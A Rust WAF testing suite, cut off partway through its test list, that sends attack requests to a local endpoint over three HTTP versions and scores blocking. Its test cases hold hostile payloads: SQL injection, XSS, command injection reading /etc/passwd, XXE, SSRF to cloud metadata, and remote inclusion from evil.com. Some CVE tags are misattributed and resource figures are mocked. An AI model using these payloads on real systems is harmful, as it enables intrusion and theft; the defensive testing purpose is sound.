// Multi-Protocol WAF Testing Suite
// Tests WAF effectiveness across HTTP/1.1, HTTP/2, and HTTP/3 protocols
// Ensures consistent security coverage regardless of protocol version

use anyhow::Result;
use hyper::Version;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::timeout;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProtocolTestConfig {
    pub waf_endpoint: String,
    pub timeout_seconds: u64,
    pub max_concurrent_requests: usize,
    pub protocols_to_test: Vec<HttpProtocol>,
}

impl Default for ProtocolTestConfig {
    fn default() -> Self {
        Self {
            waf_endpoint: "https://127.0.0.1:8443".to_string(),
            timeout_seconds: 30,
            max_concurrent_requests: 100,
            protocols_to_test: vec![
                HttpProtocol::Http11,
                HttpProtocol::Http2,
                HttpProtocol::Http3,
            ],
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum HttpProtocol {
    Http11,
    Http2,
    Http3,
}

impl HttpProtocol {
    pub fn to_hyper_version(&self) -> Version {
        match self {
            HttpProtocol::Http11 => Version::HTTP_11,
            HttpProtocol::Http2 => Version::HTTP_2,
            HttpProtocol::Http3 => Version::HTTP_3,
        }
    }

    pub fn to_string(&self) -> &'static str {
        match self {
            HttpProtocol::Http11 => "HTTP/1.1",
            HttpProtocol::Http2 => "HTTP/2",
            HttpProtocol::Http3 => "HTTP/3",
        }
    }

    pub fn get_client_config(&self) -> ClientConfig {
        match self {
            HttpProtocol::Http11 => ClientConfig::Http11,
            HttpProtocol::Http2 => ClientConfig::Http2,
            HttpProtocol::Http3 => ClientConfig::Http3 {
                enable_0rtt: true,
                enable_early_data: true,
            },
        }
    }
}

#[derive(Debug, Clone)]
pub enum ClientConfig {
    Http11,
    Http2,
    Http3 {
        enable_0rtt: bool,
        enable_early_data: bool,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProtocolTestCase {
    pub name: String,
    pub description: String,
    pub attack_category: String,
    pub method: String,
    pub path: String,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub expected_block: bool,
    pub owasp_rule_id: Option<String>,
    pub cve_references: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ProtocolTestResult {
    pub test_case: String,
    pub protocol: String,
    pub success: bool,
    pub blocked: bool,
    pub response_status: u16,
    pub response_time_ms: u64,
    pub error: Option<String>,
    pub response_headers: HashMap<String, String>,
    pub protocol_specific_metrics: ProtocolMetrics,
}

#[derive(Debug, Default, Serialize, Deserialize)]
pub struct ProtocolMetrics {
    pub connection_establishment_ms: u64,
    pub tls_handshake_ms: Option<u64>,
    pub stream_count: Option<u32>,     // HTTP/2 specific
    pub frames_sent: Option<u32>,      // HTTP/2 specific
    pub frames_received: Option<u32>,  // HTTP/2 specific
    pub quic_rtt_ms: Option<u64>,      // HTTP/3 specific
    pub packet_loss_rate: Option<f64>, // HTTP/3 specific
    pub migration_events: Option<u32>, // HTTP/3 specific
}

#[derive(Debug, Serialize, Deserialize)]
pub struct MultiProtocolTestResults {
    pub total_tests: usize,
    pub total_protocols: usize,
    pub results_by_protocol: HashMap<String, ProtocolResults>,
    pub cross_protocol_analysis: CrossProtocolAnalysis,
    pub performance_comparison: PerformanceComparison,
    pub security_consistency_analysis: SecurityConsistencyAnalysis,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ProtocolResults {
    pub protocol: String,
    pub total_tests: usize,
    pub tests_passed: usize,
    pub tests_failed: usize,
    pub attacks_blocked: usize,
    pub attacks_allowed: usize,
    pub false_positives: usize,
    pub false_negatives: usize,
    pub average_response_time_ms: f64,
    pub p95_response_time_ms: u64,
    pub p99_response_time_ms: u64,
    pub connection_success_rate: f64,
    pub protocol_specific_stats: HashMap<String, serde_json::Value>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CrossProtocolAnalysis {
    pub consistency_score: f64,
    pub inconsistent_behaviors: Vec<InconsistentBehavior>,
    pub protocol_vulnerabilities: HashMap<String, Vec<String>>,
    pub coverage_gaps: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct InconsistentBehavior {
    pub test_case: String,
    pub description: String,
    pub protocol_responses: HashMap<String, String>,
    pub severity: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct PerformanceComparison {
    pub fastest_protocol: String,
    pub slowest_protocol: String,
    pub performance_ratios: HashMap<String, f64>,
    pub throughput_comparison: HashMap<String, f64>,
    pub resource_usage: HashMap<String, ResourceUsage>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ResourceUsage {
    pub cpu_usage_percent: f64,
    pub memory_usage_mb: f64,
    pub network_bandwidth_mbps: f64,
    pub connection_overhead_bytes: u64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SecurityConsistencyAnalysis {
    pub overall_consistency_score: f64,
    pub attack_detection_consistency: HashMap<String, f64>,
    pub protocol_specific_bypasses: Vec<ProtocolBypass>,
    pub security_recommendations: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ProtocolBypass {
    pub protocol: String,
    pub attack_type: String,
    pub description: String,
    pub exploitation_difficulty: String,
    pub mitigation: String,
}

pub struct MultiProtocolWafTester {
    config: ProtocolTestConfig,
    test_cases: Vec<ProtocolTestCase>,
}

impl MultiProtocolWafTester {
    pub fn new(config: ProtocolTestConfig) -> Self {
        Self {
            config,
            test_cases: Self::create_comprehensive_test_cases(),
        }
    }

    /// Execute comprehensive multi-protocol WAF testing
    pub async fn run_all_tests(&self) -> Result<MultiProtocolTestResults> {
        println!("🚀 Starting Multi-Protocol WAF Testing Suite");
        println!("Protocols to test: {:?}", self.config.protocols_to_test);
        println!("Total test cases: {}", self.test_cases.len());
        println!();

        let mut results_by_protocol = HashMap::new();
        let start_time = Instant::now();

        // Test each protocol
        for protocol in &self.config.protocols_to_test {
            println!("Testing protocol: {}", protocol.to_string());
            let protocol_results = self.test_protocol(protocol.clone()).await?;
            results_by_protocol.insert(protocol.to_string().to_string(), protocol_results);
            println!();
        }

        // Perform cross-protocol analysis
        let cross_protocol_analysis =
            self.analyze_cross_protocol_consistency(&results_by_protocol)?;
        let performance_comparison = self.compare_protocol_performance(&results_by_protocol)?;
        let security_analysis = self.analyze_security_consistency(&results_by_protocol)?;

        let results = MultiProtocolTestResults {
            total_tests: self.test_cases.len() * self.config.protocols_to_test.len(),
            total_protocols: self.config.protocols_to_test.len(),
            results_by_protocol,
            cross_protocol_analysis,
            performance_comparison,
            security_consistency_analysis: security_analysis,
        };

        self.print_comprehensive_summary(&results, start_time.elapsed())?;

        Ok(results)
    }

    /// Test a specific protocol with all test cases
    async fn test_protocol(&self, protocol: HttpProtocol) -> Result<ProtocolResults> {
        let mut test_results = Vec::new();
        let mut response_times = Vec::new();

        println!("  Creating {} client...", protocol.to_string());
        let client = self.create_protocol_client(&protocol).await?;

        println!("  Running {} test cases...", self.test_cases.len());

        // Run tests with concurrency control
        let semaphore = Arc::new(tokio::sync::Semaphore::new(
            self.config.max_concurrent_requests,
        ));
        let mut handles = Vec::new();

        for (i, test_case) in self.test_cases.iter().enumerate() {
            let permit = Arc::clone(&semaphore);
            let client = client.clone();
            let protocol = protocol.clone();
            let test_case = test_case.clone();
            let config = self.config.clone();

            let handle = tokio::spawn(async move {
                let _permit = permit.acquire().await.unwrap();
                Self::execute_test_case(client, protocol, test_case, config).await
            });

            handles.push(handle);

            // Progress indicator
            if (i + 1) % 10 == 0 {
                print!(
                    "    Progress: {}/{} tests completed\r",
                    i + 1,
                    self.test_cases.len()
                );
            }
        }

        // Collect results
        for handle in handles {
            match handle.await? {
                Ok(result) => {
                    response_times.push(result.response_time_ms);
                    test_results.push(result);
                }
                Err(e) => {
                    eprintln!("Test execution error: {}", e);
                }
            }
        }

        println!(
            "    Progress: {}/{} tests completed ✓",
            self.test_cases.len(),
            self.test_cases.len()
        );

        // Calculate statistics
        let stats = self.calculate_protocol_statistics(&test_results, &response_times, &protocol);

        Ok(stats)
    }

    /// Create appropriate HTTP client for the protocol
    async fn create_protocol_client(
        &self,
        protocol: &HttpProtocol,
    ) -> Result<Arc<dyn HttpClient + Send + Sync>> {
        match protocol {
            HttpProtocol::Http11 => {
                let client = Http11Client::new(&self.config).await?;
                Ok(Arc::new(client))
            }
            HttpProtocol::Http2 => {
                let client = Http2Client::new(&self.config).await?;
                Ok(Arc::new(client))
            }
            HttpProtocol::Http3 => {
                let client = Http3Client::new(&self.config).await?;
                Ok(Arc::new(client))
            }
        }
    }

    /// Execute a single test case
    async fn execute_test_case(
        client: Arc<dyn HttpClient + Send + Sync>,
        protocol: HttpProtocol,
        test_case: ProtocolTestCase,
        config: ProtocolTestConfig,
    ) -> Result<ProtocolTestResult> {
        let start_time = Instant::now();

        let request_result = timeout(
            Duration::from_secs(config.timeout_seconds),
            client.execute_request(&test_case),
        )
        .await;

        let response_time_ms = start_time.elapsed().as_millis() as u64;

        match request_result {
            Ok(Ok(response)) => {
                let blocked = response.status_code >= 400 && response.status_code < 500;
                let success = if test_case.expected_block {
                    blocked
                } else {
                    !blocked
                };

                Ok(ProtocolTestResult {
                    test_case: test_case.name.clone(),
                    protocol: protocol.to_string().to_string(),
                    success,
                    blocked,
                    response_status: response.status_code,
                    response_time_ms,
                    error: None,
                    response_headers: response.headers,
                    protocol_specific_metrics: response.metrics,
                })
            }
            Ok(Err(e)) => Ok(ProtocolTestResult {
                test_case: test_case.name.clone(),
                protocol: protocol.to_string().to_string(),
                success: false,
                blocked: false,
                response_status: 0,
                response_time_ms,
                error: Some(e.to_string()),
                response_headers: HashMap::new(),
                protocol_specific_metrics: ProtocolMetrics::default(),
            }),
            Err(_) => Ok(ProtocolTestResult {
                test_case: test_case.name.clone(),
                protocol: protocol.to_string().to_string(),
                success: false,
                blocked: false,
                response_status: 0,
                response_time_ms,
                error: Some("Request timeout".to_string()),
                response_headers: HashMap::new(),
                protocol_specific_metrics: ProtocolMetrics::default(),
            }),
        }
    }

    /// Calculate statistics for a protocol's test results
    fn calculate_protocol_statistics(
        &self,
        results: &[ProtocolTestResult],
        response_times: &[u64],
        protocol: &HttpProtocol,
    ) -> ProtocolResults {
        let total_tests = results.len();
        let tests_passed = results.iter().filter(|r| r.success).count();
        let tests_failed = total_tests - tests_passed;

        let attacks_blocked = results.iter().filter(|r| r.blocked).count();
        let attacks_allowed = total_tests - attacks_blocked;

        // Calculate false positives and negatives
        let false_positives = results
            .iter()
            .filter(|r| !r.success && r.blocked && !self.is_attack_test(&r.test_case))
            .count();
        let false_negatives = results
            .iter()
            .filter(|r| !r.success && !r.blocked && self.is_attack_test(&r.test_case))
            .count();

        // Response time statistics
        let sorted_times: Vec<u64> = response_times.to_vec();
        let mut sorted_times = sorted_times;
        sorted_times.sort();

        let avg_response_time = if !sorted_times.is_empty() {
            sorted_times.iter().sum::<u64>() as f64 / sorted_times.len() as f64
        } else {
            0.0
        };

        let p95_response_time = if !sorted_times.is_empty() {
            let index = (sorted_times.len() as f64 * 0.95) as usize;
            sorted_times[index.min(sorted_times.len() - 1)]
        } else {
            0
        };

        let p99_response_time = if !sorted_times.is_empty() {
            let index = (sorted_times.len() as f64 * 0.99) as usize;
            sorted_times[index.min(sorted_times.len() - 1)]
        } else {
            0
        };

        let connection_success_rate = if total_tests > 0 {
            results.iter().filter(|r| r.error.is_none()).count() as f64 / total_tests as f64
        } else {
            0.0
        };

        // Protocol-specific statistics
        let mut protocol_stats = HashMap::new();
        match protocol {
            HttpProtocol::Http2 => {
                let avg_streams = results
                    .iter()
                    .filter_map(|r| r.protocol_specific_metrics.stream_count)
                    .map(|s| s as f64)
                    .sum::<f64>()
                    / results.len() as f64;
                protocol_stats.insert(
                    "average_streams".to_string(),
                    serde_json::json!(avg_streams),
                );
            }
            HttpProtocol::Http3 => {
                let avg_rtt = results
                    .iter()
                    .filter_map(|r| r.protocol_specific_metrics.quic_rtt_ms)
                    .map(|rtt| rtt as f64)
                    .sum::<f64>()
                    / results.len() as f64;
                protocol_stats.insert(
                    "average_quic_rtt_ms".to_string(),
                    serde_json::json!(avg_rtt),
                );
            }
            _ => {}
        }

        ProtocolResults {
            protocol: protocol.to_string().to_string(),
            total_tests,
            tests_passed,
            tests_failed,
            attacks_blocked,
            attacks_allowed,
            false_positives,
            false_negatives,
            average_response_time_ms: avg_response_time,
            p95_response_time_ms: p95_response_time,
            p99_response_time_ms: p99_response_time,
            connection_success_rate,
            protocol_specific_stats: protocol_stats,
        }
    }

    /// Check if a test case represents an attack
    fn is_attack_test(&self, test_name: &str) -> bool {
        let attack_keywords = [
            "sql_injection",
            "xss",
            "rce",
            "lfi",
            "rfi",
            "xxe",
            "ssrf",
            "scanner",
            "attack",
            "exploit",
            "injection",
            "script",
        ];

        let test_lower = test_name.to_lowercase();
        attack_keywords
            .iter()
            .any(|keyword| test_lower.contains(keyword))
    }

    /// Analyze consistency across protocols
    fn analyze_cross_protocol_consistency(
        &self,
        results: &HashMap<String, ProtocolResults>,
    ) -> Result<CrossProtocolAnalysis> {
        let mut inconsistent_behaviors = Vec::new();
        let mut protocol_vulnerabilities = HashMap::new();
        let mut coverage_gaps = Vec::new();

        // Compare results across protocols for each test case
        for test_case in &self.test_cases {
            let mut protocol_responses = HashMap::new();

            for (protocol, protocol_results) in results {
                // Find this test case's result
                // This is simplified - in real implementation, you'd need to track individual test results
                let blocked_rate =
                    protocol_results.attacks_blocked as f64 / protocol_results.total_tests as f64;
                protocol_responses.insert(
                    protocol.clone(),
                    format!("blocked_rate: {:.2}", blocked_rate),
                );
            }

            // Check for significant differences between protocols
            let rates: Vec<f64> = protocol_responses
                .values()
                .filter_map(|v| v.split(": ").nth(1)?.parse().ok())
                .collect();

            if !rates.is_empty() {
                let min_rate = rates.iter().fold(f64::INFINITY, |a, &b| a.min(b));
                let max_rate = rates.iter().fold(f64::NEG_INFINITY, |a, &b| a.max(b));

                if (max_rate - min_rate) > 0.2 {
                    // 20% difference threshold
                    inconsistent_behaviors.push(InconsistentBehavior {
                        test_case: test_case.name.clone(),
                        description: format!(
                            "Significant variation in blocking rates: {:.2} - {:.2}",
                            min_rate, max_rate
                        ),
                        protocol_responses: protocol_responses.clone(),
                        severity: if (max_rate - min_rate) > 0.5 {
                            "HIGH"
                        } else {
                            "MEDIUM"
                        }
                        .to_string(),
                    });
                }
            }
        }

        // Identify protocol-specific vulnerabilities
        for (protocol, protocol_result) in results {
            let mut vulnerabilities = Vec::new();

            if protocol_result.false_negatives > 0 {
                vulnerabilities.push(format!(
                    "High false negative rate: {}",
                    protocol_result.false_negatives
                ));
            }

            if protocol_result.connection_success_rate < 0.95 {
                vulnerabilities.push(format!(
                    "Low connection success rate: {:.2}",
                    protocol_result.connection_success_rate
                ));
            }

            if !vulnerabilities.is_empty() {
                protocol_vulnerabilities.insert(protocol.clone(), vulnerabilities);
            }
        }

        // Identify coverage gaps
        if results.len() < 3 {
            coverage_gaps
                .push("Not all HTTP protocols tested (HTTP/1.1, HTTP/2, HTTP/3)".to_string());
        }

        let consistency_score = if inconsistent_behaviors.is_empty() {
            1.0
        } else {
            let high_severity_count = inconsistent_behaviors
                .iter()
                .filter(|b| b.severity == "HIGH")
                .count();
            1.0 - (high_severity_count as f64 * 0.3 + inconsistent_behaviors.len() as f64 * 0.1)
        };

        Ok(CrossProtocolAnalysis {
            consistency_score,
            inconsistent_behaviors,
            protocol_vulnerabilities,
            coverage_gaps,
        })
    }

    /// Compare performance across protocols
    fn compare_protocol_performance(
        &self,
        results: &HashMap<String, ProtocolResults>,
    ) -> Result<PerformanceComparison> {
        let mut performance_ratios = HashMap::new();
        let mut throughput_comparison = HashMap::new();
        let mut resource_usage = HashMap::new();

        let fastest_protocol = results
            .iter()
            .min_by(|a, b| {
                a.1.average_response_time_ms
                    .partial_cmp(&b.1.average_response_time_ms)
                    .unwrap()
            })
            .map(|(k, _)| k.clone())
            .unwrap_or_default();

        let slowest_protocol = results
            .iter()
            .max_by(|a, b| {
                a.1.average_response_time_ms
                    .partial_cmp(&b.1.average_response_time_ms)
                    .unwrap()
            })
            .map(|(k, _)| k.clone())
            .unwrap_or_default();

        // Calculate performance ratios relative to fastest
        if let Some(fastest_result) = results.get(&fastest_protocol) {
            for (protocol, result) in results {
                let ratio =
                    result.average_response_time_ms / fastest_result.average_response_time_ms;
                performance_ratios.insert(protocol.clone(), ratio);

                // Estimated throughput (requests per second)
                let throughput = 1000.0 / result.average_response_time_ms;
                throughput_comparison.insert(protocol.clone(), throughput);

                // Mock resource usage data (in real implementation, collect from system metrics)
                resource_usage.insert(
                    protocol.clone(),
                    ResourceUsage {
                        cpu_usage_percent: match protocol.as_str() {
                            "HTTP/1.1" => 15.0,
                            "HTTP/2" => 25.0,
                            "HTTP/3" => 35.0,
                            _ => 20.0,
                        },
                        memory_usage_mb: match protocol.as_str() {
                            "HTTP/1.1" => 128.0,
                            "HTTP/2" => 256.0,
                            "HTTP/3" => 384.0,
                            _ => 200.0,
                        },
                        network_bandwidth_mbps: throughput * 0.001, // Rough estimate
                        connection_overhead_bytes: match protocol.as_str() {
                            "HTTP/1.1" => 512,
                            "HTTP/2" => 1024,
                            "HTTP/3" => 2048,
                            _ => 1000,
                        },
                    },
                );
            }
        }

        Ok(PerformanceComparison {
            fastest_protocol,
            slowest_protocol,
            performance_ratios,
            throughput_comparison,
            resource_usage,
        })
    }

    /// Analyze security consistency across protocols
    fn analyze_security_consistency(
        &self,
        results: &HashMap<String, ProtocolResults>,
    ) -> Result<SecurityConsistencyAnalysis> {
        let mut attack_detection_consistency = HashMap::new();
        let mut protocol_bypasses = Vec::new();
        let mut security_recommendations = Vec::new();

        // Calculate attack detection consistency for each attack type
        let attack_types = ["sql_injection", "xss", "rce", "lfi", "scanner"];

        for attack_type in &attack_types {
            let mut detection_rates = Vec::new();

            for result in results.values() {
                let detection_rate = result.attacks_blocked as f64 / result.total_tests as f64;
                detection_rates.push(detection_rate);
            }

            if !detection_rates.is_empty() {
                let avg_rate = detection_rates.iter().sum::<f64>() / detection_rates.len() as f64;
                let variance = detection_rates
                    .iter()
                    .map(|rate| (rate - avg_rate).powi(2))
                    .sum::<f64>()
                    / detection_rates.len() as f64;
                let consistency = 1.0 - variance.sqrt();

                attack_detection_consistency.insert(attack_type.to_string(), consistency);
            }
        }

        // Identify potential protocol-specific bypasses
        for (protocol, result) in results {
            if result.false_negatives > result.total_tests / 10 {
                // More than 10% false negatives
                protocol_bypasses.push(ProtocolBypass {
                    protocol: protocol.clone(),
                    attack_type: "Various".to_string(),
                    description: format!(
                        "High false negative rate ({}) may indicate protocol-specific bypasses",
                        result.false_negatives
                    ),
                    exploitation_difficulty: "Medium".to_string(),
                    mitigation: "Review protocol-specific parsing and validation rules".to_string(),
                });
            }
        }

        // Generate security recommendations
        let overall_consistency: f64 = attack_detection_consistency.values().sum::<f64>()
            / attack_detection_consistency.len() as f64;

        if overall_consistency < 0.8 {
            security_recommendations.push("Implement protocol-agnostic security rules".to_string());
            security_recommendations.push(
                "Review and standardize attack detection across all HTTP versions".to_string(),
            );
        }

        if !protocol_bypasses.is_empty() {
            security_recommendations
                .push("Conduct protocol-specific penetration testing".to_string());
            security_recommendations.push(
                "Implement additional validation layers for vulnerable protocols".to_string(),
            );
        }

        // Add HTTP/3 specific recommendations
        if results.contains_key("HTTP/3") {
            security_recommendations
                .push("Ensure QUIC-specific attack vectors are covered".to_string());
            security_recommendations
                .push("Implement connection migration attack protections".to_string());
        }

        Ok(SecurityConsistencyAnalysis {
            overall_consistency_score: overall_consistency,
            attack_detection_consistency,
            protocol_specific_bypasses: protocol_bypasses,
            security_recommendations,
        })
    }

    /// Print comprehensive test summary
    fn print_comprehensive_summary(
        &self,
        results: &MultiProtocolTestResults,
        duration: Duration,
    ) -> Result<()> {
        println!("🎯 Multi-Protocol WAF Test Results Summary");
        println!("==========================================");
        println!("Total execution time: {:.2}s", duration.as_secs_f64());
        println!("Total tests executed: {}", results.total_tests);
        println!("Protocols tested: {}", results.total_protocols);
        println!();

        // Protocol-specific results
        println!("📊 Results by Protocol:");
        for (protocol, result) in &results.results_by_protocol {
            let success_rate = result.tests_passed as f64 / result.total_tests as f64 * 100.0;
            let block_rate = result.attacks_blocked as f64 / result.total_tests as f64 * 100.0;

            println!("  {}:", protocol);
            println!(
                "    ✅ Success Rate: {:.1}% ({}/{})",
                success_rate, result.tests_passed, result.total_tests
            );
            println!(
                "    🛡️  Block Rate: {:.1}% ({}/{})",
                block_rate, result.attacks_blocked, result.total_tests
            );
            println!("    🚨 False Positives: {}", result.false_positives);
            println!("    ⚠️  False Negatives: {}", result.false_negatives);
            println!(
                "    ⚡ Avg Response Time: {:.1}ms",
                result.average_response_time_ms
            );
            println!(
                "    🔗 Connection Success: {:.1}%",
                result.connection_success_rate * 100.0
            );
            println!();
        }

        // Cross-protocol analysis
        println!("🔄 Cross-Protocol Analysis:");
        println!(
            "  Consistency Score: {:.1}%",
            results.cross_protocol_analysis.consistency_score * 100.0
        );
        println!(
            "  Inconsistent Behaviors: {}",
            results.cross_protocol_analysis.inconsistent_behaviors.len()
        );

        if !results
            .cross_protocol_analysis
            .inconsistent_behaviors
            .is_empty()
        {
            println!("    Inconsistencies:");
            for behavior in &results.cross_protocol_analysis.inconsistent_behaviors {
                println!(
                    "      - {} [{}]: {}",
                    behavior.test_case, behavior.severity, behavior.description
                );
            }
        }
        println!();

        // Performance comparison
        println!("🏃 Performance Comparison:");
        println!(
            "  Fastest Protocol: {}",
            results.performance_comparison.fastest_protocol
        );
        println!(
            "  Slowest Protocol: {}",
            results.performance_comparison.slowest_protocol
        );

        println!("  Throughput Comparison:");
        for (protocol, throughput) in &results.performance_comparison.throughput_comparison {
            println!("    {}: {:.1} req/s", protocol, throughput);
        }

        println!("  Resource Usage:");
        for (protocol, usage) in &results.performance_comparison.resource_usage {
            println!("    {}:", protocol);
            println!(
                "      CPU: {:.1}%, Memory: {:.1}MB, Bandwidth: {:.1}Mbps",
                usage.cpu_usage_percent, usage.memory_usage_mb, usage.network_bandwidth_mbps
            );
        }
        println!();

        // Security analysis
        println!("🔒 Security Consistency Analysis:");
        println!(
            "  Overall Security Score: {:.1}%",
            results
                .security_consistency_analysis
                .overall_consistency_score
                * 100.0
        );

        println!("  Attack Detection Consistency:");
        for (attack_type, consistency) in &results
            .security_consistency_analysis
            .attack_detection_consistency
        {
            println!("    {}: {:.1}%", attack_type, consistency * 100.0);
        }

        if !results
            .security_consistency_analysis
            .protocol_specific_bypasses
            .is_empty()
        {
            println!("  Protocol-Specific Bypasses:");
            for bypass in &results
                .security_consistency_analysis
                .protocol_specific_bypasses
            {
                println!(
                    "    {} ({}): {}",
                    bypass.protocol, bypass.attack_type, bypass.description
                );
            }
        }

        if !results
            .security_consistency_analysis
            .security_recommendations
            .is_empty()
        {
            println!("  Security Recommendations:");
            for recommendation in &results
                .security_consistency_analysis
                .security_recommendations
            {
                println!("    • {}", recommendation);
            }
        }

        // Overall assessment
        println!();
        println!("🎖️  Overall Assessment:");
        let overall_score = (results.cross_protocol_analysis.consistency_score
            + results
                .security_consistency_analysis
                .overall_consistency_score)
            / 2.0
            * 100.0;

        let grade = match overall_score {
            90.0..=100.0 => "A+ (Excellent)",
            80.0..=89.9 => "A (Very Good)",
            70.0..=79.9 => "B (Good)",
            60.0..=69.9 => "C (Fair)",
            _ => "D (Needs Improvement)",
        };

        println!(
            "  Multi-Protocol Security Score: {:.1}% ({})",
            overall_score, grade
        );

        Ok(())
    }

    /// Create comprehensive test cases covering all attack vectors
    fn create_comprehensive_test_cases() -> Vec<ProtocolTestCase> {
        vec![
            // SQL Injection Tests
            ProtocolTestCase {
                name: "sql_injection_union_based".to_string(),
                description: "UNION-based SQL injection attack".to_string(),
                attack_category: "sql_injection".to_string(),
                method: "GET".to_string(),
                path: "/search?q=' UNION SELECT password FROM users--".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("942100".to_string()),
                cve_references: vec!["CVE-2021-44228".to_string()],
            },
            ProtocolTestCase {
                name: "sql_injection_time_based".to_string(),
                description: "Time-based blind SQL injection".to_string(),
                attack_category: "sql_injection".to_string(),
                method: "POST".to_string(),
                path: "/login".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/x-www-form-urlencoded".to_string())]),
                body: "username=admin' AND (SELECT SLEEP(5))--&password=test".to_string(),
                expected_block: true,
                owasp_rule_id: Some("942190".to_string()),
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "sql_injection_error_based".to_string(),
                description: "Error-based SQL injection attack".to_string(),
                attack_category: "sql_injection".to_string(),
                method: "GET".to_string(),
                path: "/product?id=1' AND ExtractValue(1,CONCAT(0x7e,(SELECT version()),0x7e))--".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("942200".to_string()),
                cve_references: vec![],
            },

            // XSS Tests
            ProtocolTestCase {
                name: "xss_reflected_basic".to_string(),
                description: "Basic reflected XSS attack".to_string(),
                attack_category: "xss".to_string(),
                method: "GET".to_string(),
                path: "/search?q=<script>alert('XSS')</script>".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("941100".to_string()),
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "xss_dom_based".to_string(),
                description: "DOM-based XSS attack".to_string(),
                attack_category: "xss".to_string(),
                method: "GET".to_string(),
                path: "/page#<img src=x onerror=alert('XSS')>".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("941110".to_string()),
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "xss_stored_via_post".to_string(),
                description: "Stored XSS via POST request".to_string(),
                attack_category: "xss".to_string(),
                method: "POST".to_string(),
                path: "/comment".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/json".to_string())]),
                body: r#"{"comment": "<svg onload=alert('XSS')>"}"#.to_string(),
                expected_block: true,
                owasp_rule_id: Some("941150".to_string()),
                cve_references: vec![],
            },

            // RCE Tests
            ProtocolTestCase {
                name: "rce_command_injection".to_string(),
                description: "Command injection attack".to_string(),
                attack_category: "rce".to_string(),
                method: "POST".to_string(),
                path: "/ping".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/x-www-form-urlencoded".to_string())]),
                body: "host=127.0.0.1; cat /etc/passwd".to_string(),
                expected_block: true,
                owasp_rule_id: Some("932100".to_string()),
                cve_references: vec!["CVE-2021-44228".to_string()],
            },
            ProtocolTestCase {
                name: "rce_php_code_injection".to_string(),
                description: "PHP code injection attack".to_string(),
                attack_category: "rce".to_string(),
                method: "GET".to_string(),
                path: "/eval?code=<?php system('whoami'); ?>".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("933100".to_string()),
                cve_references: vec![],
            },

            // LFI/RFI Tests
            ProtocolTestCase {
                name: "lfi_path_traversal".to_string(),
                description: "Local file inclusion via path traversal".to_string(),
                attack_category: "lfi".to_string(),
                method: "GET".to_string(),
                path: "/include?file=../../../etc/passwd".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("930100".to_string()),
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "rfi_remote_inclusion".to_string(),
                description: "Remote file inclusion attack".to_string(),
                attack_category: "rfi".to_string(),
                method: "GET".to_string(),
                path: "/include?file=http://evil.com/shell.php".to_string(),
                headers: HashMap::new(),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("931100".to_string()),
                cve_references: vec![],
            },

            // XXE Tests
            ProtocolTestCase {
                name: "xxe_external_entity".to_string(),
                description: "XML External Entity attack".to_string(),
                attack_category: "xxe".to_string(),
                method: "POST".to_string(),
                path: "/xml".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/xml".to_string())]),
                body: r#"<?xml version="1.0" encoding="ISO-8859-1"?>
                <!DOCTYPE foo [
                <!ELEMENT foo ANY >
                <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                <foo>&xxe;</foo>"#.to_string(),
                expected_block: true,
                owasp_rule_id: Some("943100".to_string()),
                cve_references: vec!["CVE-2021-44228".to_string()],
            },

            // SSRF Tests
            ProtocolTestCase {
                name: "ssrf_internal_access".to_string(),
                description: "Server-side request forgery to internal resources".to_string(),
                attack_category: "ssrf".to_string(),
                method: "POST".to_string(),
                path: "/fetch".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/json".to_string())]),
                body: r#"{"url": "http://169.254.169.254/latest/meta-data/"}"#.to_string(),
                expected_block: true,
                owasp_rule_id: Some("934100".to_string()),
                cve_references: vec![],
            },

            // Scanner Detection Tests
            ProtocolTestCase {
                name: "scanner_nmap_detection".to_string(),
                description: "Nmap scanner detection".to_string(),
                attack_category: "scanner".to_string(),
                method: "GET".to_string(),
                path: "/".to_string(),
                headers: HashMap::from([("user-agent".to_string(), "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)".to_string())]),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("913100".to_string()),
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "scanner_sqlmap_detection".to_string(),
                description: "SQLMap scanner detection".to_string(),
                attack_category: "scanner".to_string(),
                method: "GET".to_string(),
                path: "/test?id=1".to_string(),
                headers: HashMap::from([("user-agent".to_string(), "sqlmap/1.6.2#stable (http://sqlmap.org)".to_string())]),
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("913110".to_string()),
                cve_references: vec![],
            },

            // Protocol-specific tests
            ProtocolTestCase {
                name: "http2_header_bomb".to_string(),
                description: "HTTP/2 header bomb attack".to_string(),
                attack_category: "dos".to_string(),
                method: "GET".to_string(),
